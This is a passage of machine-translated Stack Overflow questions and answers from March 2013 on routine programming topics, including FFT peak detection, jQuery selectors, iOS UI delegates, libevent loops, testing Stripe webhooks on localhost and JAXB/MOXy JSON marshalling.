            1250, 963, 720, 557, 500, 557, 720, 963 }; 
```

现在，我假设由此产生的峰值频率正好是 750 Hz，因为 (2000 - 500) / 2 = 750。

我在考虑我的采样率`Fs = 2000 Hz`，因为这是我将正弦波限制在的振荡上限。每个 bin k 的中心频率定义为`k * Fs / n`，因此我的 bin 是 125 Hz、250 Hz、375 Hz、500 Hz、625 Hz 和 750 Hz。但是因为我的振荡下限是 500 赫兹，我假设我需要用 500 赫兹偏移箱，因此它们变成：`750 Hz, 825 Hz, 1000 Hz, 1125 Hz, 1250 Hz, 1375 Hz, 1500 Hz`。

然后使用 jtransforms 的 DoubleFFT_1D 类，我得到一些 FFT 数据：

```
DoubleFFT_1D fft = new DoubleFFT_1D(n);
fft.realForward(input); 
```

输入变量现在包含：

```
[20000.0, 0.0, -4.547473508864641E-13, -5999.381020591891, 0.0, 0.0, -1.6292522886374172E-14, 1.1183950775908065, 0.0, -0.0, 1.6292522886374172E-14, -0.7488526914476931, 0.0, 0.0, 4.547473508864641E-13, -1.2482683609296146] 
```

将数组值分组为更易于理解的形式（根据我在 SO[其他地方获得的一些信息）：](https://stackoverflow.com/questions/5010261/power-spectral-density-from-jtransforms-doublefft-1d)

```
20000.0                                         [sum of input array values]
0.0,                                            [1625 Hz]
-4.547473508864641E-13, -5999.381020591891,     [re1 and im1] [750 Hz]
0.0, 0.0,                                       [re2 and im2] [875 Hz]
-1.6292522886374172E-14, 1.1183950775908065,    [re3 and im3] [1000 Hz]
0.0, -0.0,                                      [re4 and im4] [1125 Hz]
1.6292522886374172E-14, -0.7488526914476931,    [re5 and im5] [1250 Hz]
0.0, 0.0,                                       [re6 and im6] [1375 Hz]
4.547473508864641E-13, -1.2482683609296146      [re7 and im7] [1500 Hz] 
```

两个问题：

1.  我对频率区间的假设是否正确？
2.  我现在如何通过总结一些幅度来从这些数据中获得峰值频率？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T09:22:47.193

根据定义，FFT 的*输出值*不是频率；*变量*（即图表上的轴）是频率。您要做的是找到复杂结果的幅度以获得绝对值，但这些不是频率 - 相反，产生最大峰值的*x值是您想要的频率。*

[如果您不确定，可以在Wikipedia](http://en.wikipedia.org/wiki/Complex_number#Absolute_value_and_argument)上描述复数的大小。它只是实部和复数部分的平方和的平方根，但是要找到最大值，您显然不需要计算平方根。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-15T03:33:17.570

确实，一旦您确定了 bin 的频率，幅度最高的 bin 的频率就接近峰值。但是你可以通过插值做得更好。你的高峰几乎总是在垃圾箱之间。这个网站似乎有几种很好的插值方法：[http ://www.dspguru.com/dsp/howtos/how-to-interpolate-fft-peak](http://www.dspguru.com/dsp/howtos/how-to-interpolate-fft-peak)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-12T09:20:39.763

对于每个频率区间，您应该有两个值，实数 (x) 和虚数 (y) 平方和将为您提供该频率的幅度：

```
magnitude = sqrt(x*x + y*y); 
```

虽然如果只求峰值，不需要平方根，只要找到最高的频率即可

```
magSquared = x*x + y*y 
```

# jquery - html表中每一行的最后一个td

> ID：15357325
> 
> 赞同：7
> 
> 时间：2013-03-12T09:19:22.307
> 
> 标签：jquery, html-table

我知道之前已经有人问过了，但是我已经尝试过以前的解决方案，但它们对我不起作用。

我有一个由 AJAX 生成的 HTML 表：

```
<table cellspacing="1" cellpadding="7" summary="Procedure Tabulate: Table 1" frame="box" rules="groups" class="table table-bordered table-hover">
    <thead>
        <tr>
            <th scope="col" class="c m Header">&nbsp;</th>
            <th scope="col" class="c Header">reel</th>
            <th scope="col" class="c Header">budgete</th>
            <th scope="col" class="c Header">ecart</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <th scope="row" class="l t RowHeader">Fours</th>
            <td class="r b Data">15 341,10</td>
            <td class="r b Data">15 540,90</td>
            <td nowrap="" class="r b Data">  -1.29% </td>
        </tr>
        <tr>
            <th scope="row" class="l t RowHeader">Hifi</th>
            <td class="r b Data">10 578,60</td>
            <td class="r b Data"> 9 962,50</td>
            <td class="r b Data">   6.18% </td>
        </tr>
        <tr>
            <th scope="row" class="l t RowHeader">Magneto</th>
            <td class="r b Data">10 090,10</td>
            <td class="r b Data">10 495,60</td>
            <td nowrap="" class="r b Data">  -3.86% </td>
        </tr>
        <tr>
            <th scope="row" class="l t RowHeader">Total</th>
            <td class="r b Data">36 009,80</td>
            <td class="r b Data">35 999,00</td>
            <td class="r b Data">   1.04% </td>
        </tr>
    </tbody>
</table> 
```

我对表中的类没有太多控制权，因为它们是由另一组使用 SAS（统计分析软件）的人创建的。

我想得到 tbody 中每一行的最后一个 td。

目前我有以下 jQuery 来完成这项工作：

```
$( '#ajax-area table tbody tr td:last' ).addClass( 'result' ); 
```

这不是将类添加到 td.

有没有人有办法解决吗？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2013-03-12T09:23:35.090

尝试

```
$( 'table tbody tr td:last-child').addClass( 'result' ); 
```

演示：[小提琴](http://jsfiddle.net/arunpjohny/tZN3X/)

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-03-12T09:22:44.070

这应该适合你：

```
$('#ajax-area table tbody tr').find('td:last').addClass('result'); 
```

[http://jsfiddle.net/xK8EC/](http://jsfiddle.net/xK8EC/)

# jquery - 如果fancybox右键单击如何转到另一个页面？

> ID：15357328
> 
> 赞同：0
> 
> 时间：2013-03-12T09:19:44.680
> 
> 标签：jquery, fancybox, right-click

朋友们，我有一个图片库，它可以使用 fancybox 插件。这在正常单击时非常有效。如果我右键单击并在新选项卡中打开链接，则图像将显示在新选项卡中。

```
<a href="<?php echo $data['path'];?>" class="fancybox" rel="road">View Image</a> 
```

我想做的是，

*   如果用户单击鼠标右键并在新选项卡中打开，那么我想在我设计的页面上显示图像。

这可能吗？或者我怎样才能实现我的目标。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:26:47.307

如果您的页面是可访问的，您可以只更改锚`href`属性，为什么不使用属性自动在新选项卡/窗口中打开它`target`？

```
<a href="<?php echo $mypage;?>" target="_blank" class="fancybox" rel="road">View Image</a> 
```

如果您想使用 javascript 执行此操作，请参阅有关“contextmenu”事件的文档（右键单击）

[如何在网页中添加自定义右键菜单？](https://stackoverflow.com/questions/4909167/how-to-add-a-custom-right-click-menu-to-a-webpage)

# android - 知道按钮按住的时间

> ID：15357335
> 
> 赞同：1
> 
> 时间：2013-03-12T09:20:14.147
> 
> 标签：android, ontouchlistener

我希望当您在 3 秒内按住按钮时做某事，我尝试使用上面的代码，但它仅在我停止按住时才起作用，而不是在按住期间。我应该实现一个监听器还是类似的东西？

```
finishPushing = true;
.
.
.    

button.setOnTouchListener(new OnTouchListener()
            {

                @Override
                public boolean onTouch(View v, MotionEvent event) {

                    if(android.os.SystemClock.elapsedRealtime() - event.getDownTime() > 3000 && (event.getPointerCount() == 1) && finishPushing)
                    {
                        // Do something                     

                        finishPushing = false;
                    }
                    else{
                        finishPushing = true;
                    }
                    return false;
                }

            }); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-12T10:01:41.523

借助[Android Touch Event 确定持续时间已解决](https://stackoverflow.com/questions/5278579/android-touch-event-determining-duration)

```
 button.setOnTouchListener(new OnTouchListener()
        {
            private final Handler handler = new Handler();
            private final Runnable runnable = new Runnable() {
                public void run() {
                     if(mBooleanIsPressed)
                     {
                         // do whatever
                     }
                }
            };

            @Override
            public boolean onTouch(View v, MotionEvent event) {
                if(event.getAction() == MotionEvent.ACTION_DOWN) {
                    // Execute your Runnable after 5000 milliseconds = 5 seconds.
//After this 5secs it will check if is pressed
                    handler.postDelayed(runnable, 5000);    
                    mBooleanIsPressed = true;               
                }

                if(event.getAction() == MotionEvent.ACTION_UP) {
                    if(mBooleanIsPressed) {
                        mBooleanIsPressed = false;
                        handler.removeCallbacks(runnable);
                    }
                }
                return false;
            }
        }); 
```

# objective-c - 如何查看 UIAlertView 的返回值？

> ID：15357338
> 
> 赞同：0
> 
> 时间：2013-03-12T09:20:15.800
> 
> 标签：objective-c, cocoa-touch

我想检查用户是否单击“是”，例如我想执行某个操作。

这是我的代码行：

```
UIAlertView* mes=[[UIAlertView alloc] initWithTitle:@"Are you sure?" message:@"this will start a new game" delegate:self cancelButtonTitle:@"No" otherButtonTitles:@"Yes", nil];

    [mes show]; 
```

所以我想说`if user tap "yes" preform this action`

这是我的方法：我想说如果用户单击“是”创建新游戏。

```
- (IBAction)newGame:(UIButton *)sender {

    UIAlertView* mes=[[UIAlertView alloc] initWithTitle:@"Are you sure?" message:@"this will start a new game" delegate:self cancelButtonTitle:@"No" otherButtonTitles:@"Yes", nil];

    [mes show];

    self.flipsCount = 0;
    self.game = nil;
    for (UIButton *button in self.cardButtons) {
        Card *card = [self.game cardAtIndex:[self.cardButtons indexOfObject:button]];
        card.unplayble = NO;
        card.faceUp = NO;
        button.alpha = 1;
    }

    self.notificationLabel.text = nil;
    [self updateUI];
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T09:27:53.387

```
- (void)alertView:(UIAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex {
     if (buttonIndex != [alertView cancelButtonIndex])
    {
        //User clicked ok
        NSLog(@"ok");
       [self newGame:[UIButton alloc] ];
    }
    else
    {
        //User clicked cancel
        NSLog(@"cancel");
    }
} 
```

它采用从左到右的 ButtonIndex 值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T09:21:59.477

使用`UIAlertView`as的委托方法

```
- (void)alertView:(UIAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex
{
   if (buttonIndex == 1)//Yes
   {
       self.flipsCount = 0;
       self.game = nil;
       for (UIButton *button in self.cardButtons) 
       {
            Card *card = [self.game cardAtIndex:[self.cardButtons indexOfObject:button]];
            card.unplayble = NO;
            card.faceUp = NO;
            button.alpha = 1;
       }

       self.notificationLabel.text = nil;
       [self updateUI];
   }
   else//No 
   {
       //do something
   }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-12T09:23:14.010

在同一类（或您设置为的类`delegate`）中插入以下方法：

```
- (void)alertView:(UIAlertView *)actionSheet clickedButtonAtIndex:(NSInteger)buttonIndex
{
  if (buttonIndex == 0)
  {
    //User clicked ok
  }
  else
  {
    //User clicked cancel
  }
} 
```

# c++ - 在 libevent 中使用 EVLOOP_NONBLOCK

> ID：15357347
> 
> 赞同：0
> 
> 时间：2013-03-12T09:20:44.537
> 
> 标签：c++, libevent

在`libevent`我添加了以下代码：

```
while (run) {
  event_base_loop(base, EVLOOP_NONBLOCK | EVLOOP_ONCE);
} 
```

如果我将其与以下内容进行比较：

```
event_base_dispatch(base); 
```

这两个陈述是否相等？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T14:13:37.870

不，`event_base_dispatch(base)`调用等效于`event_base_loop(base, 0)`，这意味着它既不会在第一批事件之后停止（如`event_base_loop`使用`EVLOOP_ONCE`dos），也不会在没有事件准备好时立即返回（如`event_base_loop`使用`EVLOOP_NONBLOCK`dos）。

您可能想阅读 Nick Mathewson 写的关于 libevent 的好书：[http ://www.wangafu.net/~nickm/libevent-book/Ref3_eventloop.html](http://www.wangafu.net/~nickm/libevent-book/Ref3_eventloop.html)

# iphone - 如何以编程方式识别 Iphone 中哪个连接处于活动状态（WiFi 或以太网）

> ID：15357351
> 
> 赞同：1
> 
> 时间：2013-03-12T09:20:59.987
> 
> 标签：iphone, objective-c, xcode

我需要以编程方式识别 Iphone 中哪个连接处于活动状态（WiFi 或以太网）。如果用户正在使用 WiFi，那么我必须在我的应用程序中显示不同的视图控制器。

请帮忙。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-12T09:26:43.660

你可以使用苹果提供的可达性类听到下面的例子请检查这个由苹果提供的示例代码。

[http://developer.apple.com/iphone/library/samplecode/Reachability/index.html](http://developer.apple.com/iphone/library/samplecode/Reachability/index.html)

您可以在您的项目中使用它，如下所示：-

`included Apple's Reachability.h & .m from their Reachability example.`

`add the SystemConfiguration framework.`

当您使用它时，您只需调用 Bellow 方法：-

```
Reachability* wifiReach = [[Reachability reachabilityWithHostName: @"www.apple.com"] retain];
NetworkStatus remoteHostStatus = [wifiReach currentReachabilityStatus];

switch (remoteHostStatus)
{
    case NotReachable:
    {
        NSLog(@"Access Not Available");
        break;
    }

    case ReachableViaWWAN:
    {
        NSLog(@"Reachable WWAN");
        break;
    }
    case ReachableViaWiFi:
    {
        NSLog(@"Reachable WiFi");
        break;
    }
} 
```

# iphone - 导航问题

> ID：15357354
> 
> 赞同：0
> 
> 时间：2013-03-12T09:21:05.157
> 
> 标签：iphone, ios, uinavigationcontroller, uitabbarcontroller, rootview

我想通过使用此代码单击第四个选项卡栏上的按钮导航到第一个选项卡栏项目的 Rootview 只是更改选项卡栏选择

代码片段

> [self.parentViewController.tabBarController setSelectedIndex:0];

上一个动作将出现在主视图控制器中。

我需要主页视图控制器的直接导航

如何解决这个问题？

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T09:30:47.940

首先获取第一个标签栏项目的 UINavigationController。

```
UINavigationController *navController = [self.tabBarController.viewControllers objectAtIndex:0]; 
```

然后导航到根视图控制器。

```
navController popToRootViewControllerAnimated:NO]; 
```

就这样。:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T09:33:22.600

您必须将选定的标签栏导航堆栈弹出到根目录。您可以通过以下几种方法实现此目的..

在您的 AppDelegate 中实现 tabbarcontroller 委托功能，确保您已将 tabbarcontroller 委托设置为 AppDelegate..

```
-(void) tabBarController:(UITabBarController *)tabBarController didSelectViewController:(UIViewController *)viewController
 //Check the selected index to 0
 if ([viewController isKindOfClass:[UINavigationController class]] && tabBarController.selectedIndex == 0) { 
    [(UINavigationController *)viewController popToRootViewControllerAnimated:NO]; 
 }
} 
```

# php - 是否可以将 localhost 设置为 Stripe webhook URL？

> ID：15357356
> 
> 赞同：29
> 
> 时间：2013-03-12T09:21:11.187
> 
> 标签：php, stripe-payments, webhooks

我正在使用 Stripe 创建支付网关。

我想将我的 localhost url 设置`localhost/stripe/webhook.php`为我的 webhook url。是否可以将 localhost 地址设置为 webhook url？这将用于创建在 Stripe 中每次成功收费时触发的邮件服务。

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2013-07-16T15:01:49.817

Stripe 现在有一个官方工具，Stripe CLI 使这变得简单（但仍然需要安装另一个工具）。

请参阅[下面的答案](https://stackoverflow.com/a/58073355/4708127)或[官方 Stripe CLI 文档](https://stripe.com/docs/stripe-cli)。

或者，实现此目的的另一种方法是使用[http://www.ultrahook.com](http://www.ultrahook.com)，它允许您在 localhost 上接收 webhook。此替代方案适用于所有 webhook，而不仅仅是 Stripe 的

* * *

## 回答 #2

> 赞同：30
> 
> 时间：2016-12-21T14:42:15.260

如何使用 ngrok 并设置 Stripe Webhooks url

[来源链接](http://www.thecodedeveloper.com/run-stripe-webhooks-url-from-localhost/)

1.  首先下载[ngrok](https://ngrok.com/download)并解压到你的电脑上
2.  双击 ngrok.exe
3.  尝试在此终端提示符下键入**ngrok.exe http 80**以公开端口 80

4.  例如，如果我们在 localhost 上有 Stripe webhooks url，例如 [http://localhost/stripeproject/webhook.php](http://localhost/stripeproject/webhook.php)

5.  只需将您的 ngrok url 指定为您的 webhooks 服务的端点，您就差不多完成了。

6.  您可以设置此网址 [http://f253021b.ngrok.io/stripeproject/webhook.php](http://f253021b.ngrok.io/stripeproject/webhook.php)以在您帐户的 webhook 设置中将测试 webhook 发送到您的集成端点。

它对我来说很好。

更多详情[请点击这里](http://www.thecodedeveloper.com/run-stripe-webhooks-url-from-localhost/)

* * *

## 回答 #3

> 赞同：28
> 
> 时间：2019-09-24T05:02:23.353

现在有另一种选择：您现在可以使用[Stripe CLI](https://stripe.com/docs/stripe-cli)在本地无缝测试 webhook，而无需 3rd 方工具。

在这种情况下，您只需执行[以下](https://stripe.com/docs/stripe-cli#forward-events)操作即可将您的 Stripe 事件检测到您的本地 webhook 处理程序代码：

```
stripe listen --forward-to localhost/stripe/webhook.php 
```

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2013-03-14T19:16:21.693

不，这行不通。Stripe 服务器必须能够联系您的服务器以发送 webhook。Stripe 不知道如何联系您的“本地主机”。您需要一个可访问网络的地址或 IP 地址才能正常工作

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2021-02-18T04:55:24.790

尝试使用条带 CLI：

在这里，您可以将事件转发到您的 Localhost 服务器。

[https://stripe.com/docs/webhooks/test](https://stripe.com/docs/webhooks/test)

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2019-09-03T08:23:03.910

更简单的是，在本地运行时将此端点添加到您的应用程序中（而不是在产品中！）：

```
const eventsSeen = new Set();

app.post("/test/simulate-stripe-webhook", async (req, res) => {
  const events = await stripe.events.list({ limit: req.query.limit || 10 });
  for (const event of events) {
    if (eventsSeen.has(event.id)) continue;
    await processStripeEvent(event);
    eventsSeen.add(event.id);
  }
  return res.status(200).end();
}); 
```

...`processStripeEvent`您的 webhook 触发的逻辑在哪里。

那么就不需要在条带中管理 webhook。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2014-09-19T10:02:48.587

可以将 webhook 发送到您的本地主机。查找“ngrok”，当你运行它时，它会打开一个公共互联网访问端口，并为你提供一个可以访问你的本地主机的 URL。获取此 url 并将其设置为您的 webhook 地址，并通过将其指向您的 webhook.php 文件来完成该 u​​rl。

*** 编辑 ***

这仅适用于测试。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-03-17T04:16:39.217

就像马特说的那样，你需要把它放在网上的某个地方——最好使用 https://。供您参考，我在 2 个月前在这里放置了一个示例邮件 webhook：[https](https://github.com/pnommensen/Stripe-Webhook-Emails) ://github.com/pnommensen/Stripe-Webhook-Emails 。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2021-01-22T06:15:29.437

**是的 可以**在本地主机上测试条形网络挂钩 转到此 URL [https://dashboard.stripe.com/test/webhooks/](https://dashboard.stripe.com/test/webhooks/)并打开您的端点，例如 [https://test.com/api/StripeHook](https://test.com/api/StripeHook) 现在打开您的 Webhook 尝试，然后剥离并复制所有 json 代码。

现在在本地主机上运行您的项目并打开邮递员并点击 https://localhost/api/StripeHook 并将所有复制的 json 文本放入邮递员的正文数据中。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2020-07-13T10:12:24.783

您可以使用expose.sh 通过公共HTTPS URL 公开您的服务器。

## 安装expose.sh

对于 Mac 或 Linux，转到[Expose.sh](https://expose.sh?utm_source=stackOverflow)并将显示的安装代码复制/粘贴到终端中。

对于 Windows，请转到[Expose.sh](https://expose.sh?utm_source=stackOverflow)，下载二进制文件并将其放在 PATH 中的某个位置。

## 将您的 api 暴露给网络

启动您的 API 服务器。然后运行`expose <port>`其中的端口是您的 API 服务器正在运行的端口，例如 80 或 8080。

Expose.sh 将生成一个随机的公共 Expose.sh URL。你会看到像这样的输出

```
https://s3rh.expose.sh is forwarding to localhost:80
http://s3rh.expose.sh is forwarding to localhost:80 
```

然后，您可以让 Stripe 使用公共 HTTPS URL，该 URL 将转发到 localhost。我在[这里写了一个完整的指南](https://expose.sh/blog/2020/07/09/validate-webhooks-on-localhost?utm_source=stackOverflow)

免责声明：我构建了expose.sh

# javascript - 如何跨浏览器删除具有随机长度和 __xyz__ 边界的字符串的一部分？

> ID：15357359
> 
> 赞同：0
> 
> 时间：2013-03-12T09:21:24.383
> 
> 标签：javascript, jquery, arrays, internet-explorer, split

我有一个表单，其中包含字段名称的动态编号，如下所示：

```
 fieldA__1__
 fieldA__2__
 fieldA__3__ 
```

在我的表单处理程序中，我有所有传入错误的响应消息，但是，我只有一个响应`fieldA`，因此如果服务器告诉我错误，我的错误处理程序将没有响应`field__123__`。

我试图解决这个拆分返回字段的问题，如下所示：

```
// returnField = "fieldA__1__";
lookupField = returnfield.split("__")[0] 
```

我希望它总是给我我正在寻找的字段名，因为拆分应该总是返回我正在寻找的字段。

```
fieldA      >  fieldA
fieldA__1__ >  fieldA 
```

然而，这似乎打破了 IE ......（当然）。

**问题：**
分割字符串并返回分割字符串的第一个元素的跨浏览器安全方法是什么？

谢谢！

# java - 我可以在 java 编译器将 AST 编译为类文件之前修改 AST

> ID：15357362
> 
> 赞同：2
> 
> 时间：2013-03-12T09:21:41.780
> 
> 标签：java, javac

我想在源代码编译到类文件之前添加一些东西（例如：添加方法或字段）。但我不知道该怎么做。有什么办法可以做到吗？

我知道一个开源项目 Lombok，它可以自动将 setter 和 getter 方法添加到一个类中，并且 IDE(eclipse) 现在可以找到新添加的方法。所以有人可以告诉我它是如何实现的吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-12T10:48:46.443

lombok的[源代码在 github 上](https://github.com/rzwitserloot/lombok)。Afaik 它使用[javac 注释处理功能](http://docs.oracle.com/javase/6/docs/technotes/tools/solaris/javac.html#processing)的内部 api 。注释处理器只应该能够创建新文件，而不是修改当前编译的文件。通过类型转换、修补类加载器和覆盖一些方法，lombok 能够修改当前编译的 java 文件的抽象语法树并添加方法或源代码。它有效，但我认为它是一种黑客行为，并不太依赖它。

如果你想修改创建的类文件，我认为像[cglib](http://cglib.sourceforge.net/)或[asm](http://asm.ow2.org/)这样的字节码重写框架是更干净的解决方案。

# c# - OpenFilePicker 在 Windows Phone 8 上不起作用（不支持指定的方法）

> ID：15357363
> 
> 赞同：1
> 
> 时间：2013-03-12T09:21:43.797
> 
> 标签：c#, .net, xaml, windows-phone-8, fileopenpicker

我正在尝试使用以下方法选择一个文件：

```
private async void Button_Click_1(object sender, RoutedEventArgs e)
{
    try
    {
            FileOpenPicker openPicker = new FileOpenPicker();
            openPicker.ViewMode = PickerViewMode.Thumbnail;
            openPicker.SuggestedStartLocation = PickerLocationId.PicturesLibrary;
            openPicker.FileTypeFilter.Add(".jpg");
            openPicker.FileTypeFilter.Add(".jpeg");
            openPicker.FileTypeFilter.Add(".png");

            StorageFile file = await openPicker.PickSingleFileAsync();
            if (file != null)
            {
                // Application now has read/write access to the picked file
                txt.Text = "Picked file: " + file.Name;
            }
            else
            {
                txt.Text = "Operation cancelled.";
            }

    }
    catch (Exception exception)
    {
        txt.Text = exception.Message;
    }
} 
```

...但它抛出一个异常：`指定的方法不受支持。";

我从 Windows Phone 8 文档中复制并粘贴了代码。他们的样品都不起作用。我想也许我缺少文档功能/合同或其他任何东西，但它们甚至不存在于 VS for Phone 应用程序中。

为什么这行不通？

我已将其追踪到尝试的第一行：

```
FileOpenPicker openPicker = new FileOpenPicker(); // this is the line the exception is thrown on. 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-12T16:50:49.783

根据 MSDN 论坛和我认为是 MS 员工的答案（[这里](http://social.msdn.microsoft.com/Forums/en-US/wpdevelop/thread/7e4492dc-d8f3-4dc5-8055-625352aaa8b6/)）：

> 我们目前不支持选择照片以外的文件或从其他商店应用程序中选择文件。

所以看起来你被困在了`PhotoChooserTask`而不是`FileOpenPicker`。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-06-02T14:32:55.957

这确实有效，但仅适用于 Windows Phone 8.1 (Windows Phone) 而不是 Windows Phone 8.0/8.1 (Windows Phone Silverlight)。

这是代码：

```
FileOpenPicker singleFilePicker = new FileOpenPicker();
        singleFilePicker.ViewMode = PickerViewMode.Thumbnail;
        singleFilePicker.SuggestedStartLocation = PickerLocationId.PicturesLibrary;
        singleFilePicker.FileTypeFilter.Add(".jpg");
        singleFilePicker.FileTypeFilter.Add(".jpeg");
        singleFilePicker.FileTypeFilter.Add(".png");
        singleFilePicker.PickSingleFileAndContinue(); 
```

添加此方法来处理所选照片：

```
public void ContinueFileOpenPicker(FileOpenPickerContinuationEventArgs args)
    {
        if (args.Files.Count > 0)
        {
            var userChosenbPhoto = args.Files[0].Name;
        }
        else
        {
            //user canceled picker
        }
    } 
```

您也可以抓取多个文件。

最后但最重要的是，您需要在项目中添加一个**延续管理器**类。这将在从选择器返回时管理应用程序的重新激活。[转到此文档以了解如何将 ContinuationManager 添加](http://msdn.microsoft.com/en-us/library/dn631755.aspx)到项目中（抱歉链接，太多信息放在这里）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-12T09:26:45.513

您只能使用`FileOpenPicker`来自本机应用程序的应用程序，例如 Direct3D 应用程序。

您可以改用[PhotoChooserTask](http://msdn.microsoft.com/en-US/library/windowsphone/develop/microsoft.phone.tasks.photochoosertask%28v=vs.105%29.aspx)从图片中心选择图片。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-05-02T10:09:52.690

根据文档，提到：最低支持电话：不支持

检查此链接以获取详细信息 [http://msdn.microsoft.com/en-us/library/windowsphone/develop/br207852.aspx](http://msdn.microsoft.com/en-us/library/windowsphone/develop/br207852.aspx)

# javascript - 用于标记的文本区域（不是 HTML 标记）

> ID：15357365
> 
> 赞同：1
> 
> 时间：2013-03-12T09:21:55.550
> 
> 标签：javascript, jquery, tagging

谷歌搜索是非常非常令人沮丧的。每当我搜索单词标签和编辑器、文本区域或文本字段时，我都会找到一些用于 HTML 的所见即所得编辑器。

但我正在寻找一个允许我以表单形式编辑和添加标签的 javascript 插件。像这篇文章下面的标签。您输入第一个字母并选择标签或关键字或其他内容。

我需要的是一个类似的用于文本区域的插入式 jQuery 插件。Tumblr 也有它，直到他们最近改变了它。

任何人都可以帮忙吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T09:31:44.100

你在找什么在[这里](http://xoxco.com/projects/code/tagsinput/)...

Taginputs 易于使用，文档齐全，内置 jquery 并且完全可定制......类似于 stackoverflow 的标签输入......:)......

您可以同时使用 textarea 或 div 来显示标签...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T09:25:14.493

您需要 jQuery 自动完成插件。

[http://jqueryui.com/autocomplete/](http://jqueryui.com/autocomplete/)

# java - 使用 Marshaller 将 Java 对象转换为 Json

> ID：15357366
> 
> 赞同：19
> 
> 时间：2013-03-12T09:21:55.653
> 
> 标签：java, json, jakarta-ee, jaxb, marshalling

使用 Marshaller 将 java 对象转换为 XML 非常容易。但我需要单独使用 marshaller 将 java 对象转换为 JSON。我知道使用 gson 或 Xstream 之类的东西很好，但我需要使用 Marshaller。如何实现它？

提前致谢。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-03-12T11:03:05.550

**注意：** 我是[**EclipseLink JAXB (MOXy)**](http://www.eclipse.org/eclipselink/moxy.php)负责人，也是[**JAXB (JSR-222)**](http://jcp.org/en/jsr/detail?id=222)专家组的成员，

如果您使用 MOXy 作为您的 JAXB 提供程序，下面是如何做到这一点的。

*   [http://blog.bdoughan.com/2011/08/json-binding-with-eclipselink-moxy.html](http://blog.bdoughan.com/2011/08/json-binding-with-eclipselink-moxy.html)

**JAVA模型**

**顾客**

```
import java.util.*;
import javax.xml.bind.annotation.*;

@XmlRootElement(namespace="http://www.example.com")
@XmlType(namespace="http://www.example.com")
@XmlAccessorType(XmlAccessType.FIELD)
public class Customer {

    @XmlAttribute
    private int id;

    @XmlElement(namespace="http://www.example.com")
    private String firstName;

    @XmlElement(namespace="http://www.example.com", nillable=true)
    private String lastName;

    @XmlElement(namespace="http://www.example.com")
    private List<PhoneNumber> phoneNumbers = new ArrayList<PhoneNumber>();

} 
```

**电话号码**

```
import javax.xml.bind.annotation.*;

@XmlAccessorType(XmlAccessType.FIELD)
public class PhoneNumber {

    @XmlAttribute
    private String type;

    @XmlValue
    private String number;

} 
```

**jaxb.properties**

要将 MOXy 指定为您的 JAXB 提供程序，您需要包含一个`jaxb.properties`在与域模型相同的包中调用的文件，其中包含以下条目（请参阅： [http ://blog.bdoughan.com/2011/05/specifying-eclipselink-moxy-as -你的.html](http://blog.bdoughan.com/2011/05/specifying-eclipselink-moxy-as-your.html) )

```
javax.xml.bind.context.factory=org.eclipse.persistence.jaxb.JAXBContextFactory 
```

**演示代码**

**输入.xml**

```
<?xml version="1.0" encoding="UTF-8"?>
<ns0:customer xmlns:ns0="http://www.example.com" id="123">
   <ns0:firstName>Jane</ns0:firstName>
   <ns0:lastName xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:nil="true"/>
   <ns0:phoneNumbers type="work">555-1111</ns0:phoneNumbers>
</ns0:customer> 
```

**演示**

在下面的演示代码中，我们将使用相同的 JAXB 元数据将 XML 文档转换为 Java 对象，然后将这些对象转换回 JSON。使用 MOXy，您可以通过在`Marshaller`.

```
import java.io.File;
import javax.xml.bind.*;
import org.eclipse.persistence.jaxb.MarshallerProperties;

public class Demo {

    public static void main(String[] args) throws Exception {
        JAXBContext jc = JAXBContext.newInstance(Customer.class);

        Unmarshaller unmarshaller = jc.createUnmarshaller();
        File xml = new File("src/forum15357366/input.xml");
        Customer customer = (Customer) unmarshaller.unmarshal(xml)
                ;
        Marshaller marshaller = jc.createMarshaller();
        marshaller.setProperty(Marshaller.JAXB_FORMATTED_OUTPUT, true);
        marshaller.setProperty(MarshallerProperties.MEDIA_TYPE, "application/json");
        marshaller.setProperty(MarshallerProperties.JSON_INCLUDE_ROOT, false);
        marshaller.marshal(customer, System.out);
    }

} 
```

**JSON 输出**

下面是 JSON 输出。请注意没有与名称空间或 XML 属性相对应的指示符。另请注意，大小为 1 的集合被正确表示为 JSON 数组（其他一些方法存在问题）。

```
{
   "id" : 123,
   "firstName" : "Jane",
   "lastName" : null,
   "phoneNumbers" : [ {
      "type" : "work",
      "value" : "555-1111"
   } ]
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T09:27:28.497

